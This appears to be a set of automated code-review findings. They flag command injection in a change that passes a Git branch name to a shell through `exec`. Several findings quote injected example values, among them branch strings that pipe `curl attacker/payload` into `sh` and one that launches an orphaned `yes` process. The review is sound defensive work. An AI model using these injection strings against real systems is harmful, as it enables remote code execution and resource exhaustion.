findings.title: [P1] Pass the branch to Git without invoking a shell
findings.body: When `branch` contains shell metacharacters, `exec(\`git show ${branch}\`)` interprets them as commands. For example, a value containing `; <command>` executes that command with the application's privileges. Shell operators can also detach work from the returned child process, breaking completion and cancellation semantics. Restore `execFile("git", ["show", branch])` or otherwise avoid shell interpolation.

findings.title: [P1] Keep Git attached to the returned child lifecycle
findings.body:
On POSIX, a valid branch name containing a shell operator—e.g. `showBranch("feature&")`—is parsed by `exec` as a background job. The returned `ChildProcess` tracks the shell, which can emit `exit` with success before Git finishes or fails; killing it also does not cancel the background Git process. This breaks completion, status, and cancellation semantics previously provided by `execFile`.

_Recommend validating this comment independently._

findings.title: [P1] Keep branch names out of the shell command
findings.body:
`exec()` interprets `branch` as shell syntax. Any attacker-controlled value such as `main; curl attacker/payload | sh` executes arbitrary commands with the process’s privileges. The previous `execFile("git", ["show", branch])` passed it as a literal argument.

_Recommend validating this comment independently._

findings.title: [P1] Pass the branch to `git` without invoking a shell
findings.body:
`exec()` interpolates `branch` into a shell command, allowing arbitrary command execution when the value is attacker-controlled. For example, `showBranch("HEAD; curl attacker/payload | sh")` executes the injected command; the previous `execFile()` implementation treated it as a single argument.

_Recommend validating this comment independently._

findings.title: [P1] Restore argument-safe spawning to prevent persistent subprocess leaks
findings.body:
On POSIX, a caller-controlled branch such as `HEAD; yes </dev/null >/dev/null 2>&1 &` launches an orphaned CPU-consuming process. The previous `execFile` call treated the branch as one Git argument; shell interpolation now permits one request to cause persistent resource exhaustion.

_Recommend validating this comment independently._
